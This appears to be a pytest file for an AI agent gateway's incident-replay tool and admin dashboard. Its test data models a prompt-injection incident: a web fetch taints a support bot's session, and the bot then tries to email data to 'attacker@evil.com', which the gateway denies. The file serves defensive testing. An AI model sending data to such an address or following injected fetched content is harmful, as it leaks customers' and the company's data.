"""Incident replay and the timeline dashboard: a full incident
reconstructed from the log."""
from __future__ import annotations

import json
import threading
import time

import pytest
import uvicorn
from fastapi.testclient import TestClient

from gateway.audit import AuditLog
from gateway.demo_server import create_demo_server
from gateway.proxy import Gateway, create_app
from gateway.replay import load_log, replay, render_text

AGENT_KEY = "demo-key-support-bot"
ADMIN_KEY = "admin-secret"


def _seed_log(path):
    """A small incident, written the way the gateway writes it:
    a clean read, a fetch that taints the session, a blocked
    exfiltration, and an internal email that still works."""
    log = AuditLog(path)
    log.append("support-bot", "crm.read_customer",
               {"customer_id": "cust_1"}, "allow", "allowed",
               session_id="B")
    log.append("support-bot", "web.fetch",
               {"url": "https://docs.company.com/help"}, "allow",
               "allowed", session_id="B")
    log.append("support-bot", "email.send",
               {"to": "attacker@evil.com"}, "deny",
               "denied while tainted", tainted=True, session_id="B")
    log.append("support-bot", "email.send",
               {"to": "team@company.com"}, "allow", "allowed",
               tainted=True, session_id="B")
    log.append("support-bot", "crm.read_customer",
               {"customer_id": "cust_2"}, "allow", "allowed",
               session_id="A")
    return path


def test_replay_filters_by_session(tmp_path):
    path = _seed_log(tmp_path / "audit.jsonl")
    incident = replay(path, session_id="B")
    assert len(incident.entries) == 4
    assert all(e["session_id"] == "B" for e in incident.entries)


def test_replay_identifies_the_taint_event(tmp_path):
    path = _seed_log(tmp_path / "audit.jsonl")
    incident = replay(path, session_id="B")
    assert incident.taint_event is not None
    assert incident.taint_event["tool"] == "web.fetch"
    assert len(incident.blocked_after_taint) == 1
    assert incident.blocked_after_taint[0]["tool"] == "email.send"


def test_replay_sums_spend_and_rows(tmp_path):
    path = tmp_path / "audit.jsonl"
    log = AuditLog(path)
    log.append("support-bot", "crm.read_customer", {}, "allow", "ok",
               cost=0.01, rows=5)
    log.append("support-bot", "email.send", {}, "allow", "ok",
               cost=0.02, rows=0)
    incident = replay(path)
    assert incident.total_spend == 0.03
    assert incident.total_rows == 5
    assert incident.decisions == {"allow": 2}


def test_replay_without_taint_has_no_taint_event(tmp_path):
    path = tmp_path / "audit.jsonl"
    log = AuditLog(path)
    log.append("support-bot", "crm.read_customer", {}, "allow", "ok")
    incident = replay(path)
    assert incident.taint_event is None
    assert incident.blocked_after_taint == []


def test_render_text_names_the_cause(tmp_path):
    path = _seed_log(tmp_path / "audit.jsonl")
    text = render_text(replay(path, session_id="B"))
    assert "tainted by: #2 web.fetch" in text
    assert "blocked after taint: #3 email.send" in text


@pytest.fixture(scope="module")
def upstream():
    thread = threading.Thread(
        target=uvicorn.run,
        args=(create_demo_server(),),
        kwargs={"host": "127.0.0.1", "port": 8005, "log_level": "error"},
        daemon=True)
    thread.start()
    time.sleep(1.0)
    yield "http://127.0.0.1:8005/mcp"


@pytest.fixture()
def gateway(tmp_path, upstream):
    return Gateway(policy_dir="policies",
                   keys={AGENT_KEY: "support-bot"},
                   upstream_url=upstream,
                   audit_path=tmp_path / "audit.jsonl",
                   data_dir=tmp_path / "data",
                   admin_key=ADMIN_KEY)


@pytest.fixture()
def client(gateway):
    return TestClient(create_app(gateway))


def _call(client, tool, args, session="default"):
    return client.post("/mcp", headers={"x-agent-key": AGENT_KEY,
                                        "x-session-id": session},
                       json={"jsonrpc": "2.0", "id": 1,
                             "method": "tools/call",
                             "params": {"name": tool,
                                        "arguments": args}})


def test_dashboard_renders_the_timeline(client):
    _call(client, "crm.read_customer", {"customer_id": "cust_1"})
    _call(client, "email.send", {"to": "x@evil.com", "subject": "s",
                                 "body": "b"})
    headers = {"x-admin-key": ADMIN_KEY}
    resp = client.get("/admin/dashboard", headers=headers)
    assert resp.status_code == 200
    assert "Agent Gateway — timeline" in resp.text
    assert "crm.read_customer" in resp.text
    assert "email.send" in resp.text
    assert "deny" in resp.text


def test_dashboard_needs_the_admin_key(client):
    assert client.get("/admin/dashboard").status_code == 401


def test_replay_endpoint_reconstructs_the_injection(client):
    _call(client, "web.fetch",
          {"url": "https://docs.company.com/help"}, session="B")
    _call(client, "email.send", {"to": "attacker@evil.com",
                                 "subject": "list", "body": "x"},
          session="B")
    headers = {"x-admin-key": ADMIN_KEY}
    resp = client.get("/admin/replay?session=B", headers=headers)
    data = resp.json()
    assert data["taint_event"]["tool"] == "web.fetch"
    assert len(data["blocked_after_taint"]) == 1
    assert data["blocked_after_taint"][0]["tool"] == "email.send"
